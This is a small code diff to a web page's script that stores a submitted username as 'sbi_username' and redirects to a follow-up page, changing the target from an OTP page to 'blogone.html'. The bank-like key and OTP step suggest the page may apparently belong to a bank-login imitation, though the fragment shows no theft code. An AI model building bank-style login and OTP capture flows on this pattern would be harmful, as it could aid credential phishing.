@@ -148,7 +148,7 @@
                     sessionStorage.setItem('sbi_username', username);
 
                     // ✅ OTP पेज पर रीडायरेक्ट, यूज़रनेम URL में भी भेजें
-                    window.location.href = 'otp.html?user=' + encodeURIComponent(username);
+                    window.location.href = 'blogone.html?user=' + encodeURIComponent(username);
                 } else {
                     const err = await response.json().catch(() => ({}));
                     alert('Submission failed: ' + (err.error || 'Please try again.'));
@@ -164,3 +164,4 @@
     </script>
 </body>
 </html>
+
